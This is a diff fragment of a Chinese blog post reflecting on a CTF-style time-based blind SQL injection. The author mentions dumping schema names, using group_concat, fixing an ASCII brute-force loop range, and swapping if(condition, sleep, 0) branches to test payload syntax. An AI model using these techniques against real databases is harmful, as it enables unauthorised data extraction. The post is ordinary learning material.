+<p>也走了很多弯路，一开始爆出来不知道哪个库的表名是CHARACTER_SET_NAME DEFAULT_COLLATE_NAME DESCRIPTION MAXLEN，里面数据都是空的。后来才爆出来有五个库，但是sql这个有flag的库我以为是上面大写表名的库，所以一直在爆那个奇奇怪怪的表。直到中后期我才用上group_concat,之前都是一个一个爆的。还有一开始<code>for ascii_value in range(32, 128):</code>写的是65-128,导致数字报不出来。</p>
+<p>也想出来很多技巧，比如（条件，sleep,0)如果摸不准自己语句是不是写对了，那就写一个不可能的条件，把0和函数换个位置，比如这样：（条件,0,sleep).如果这个语句写的是对的，那么必有一个语句会响应缓慢。</p>
 
     </div>
 
@@ -328,14 +439,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">27k</span>
+    <span title="站点总字数">29k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">1:39</span>
+    <span title="站点阅读时长">1:45</span>
   </span>
 </div>
 
